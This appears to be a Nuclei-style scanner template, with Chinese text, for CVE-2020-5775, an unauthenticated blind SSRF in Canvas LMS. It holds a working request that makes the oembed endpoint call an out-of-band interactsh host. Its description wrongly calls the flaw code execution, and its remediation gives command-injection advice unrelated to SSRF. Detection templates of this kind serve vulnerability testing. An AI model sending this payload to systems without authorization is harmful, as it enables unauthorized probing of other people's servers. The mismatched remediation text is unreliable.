id: CVE-2020-5775
info:
  name: Canvas LMS Unauthenticated Blind SSRF
  author:
  - alph4byt3
  description: |-
    Canvas LMS 代码执行漏洞
    Canvas LMS 2020-07-29 存在安全漏洞，未经身份验证的攻击者导致Canvas应用程序对任意域执行HTTP GET请求。
  severity: medium
  remediation: |-
    官方修复方案：<br />1、升级系统至无漏洞版本，或于官网下载安全补丁
    https://www.tenable.com/security/research/tra-2020-49

    临时修复方案：<br />1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。<br />2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  path:
  - '{{BaseURL}}/external_content/retrieve/oembed?endpoint=http://{{interactsh-url}}&url=foo'
  method: GET
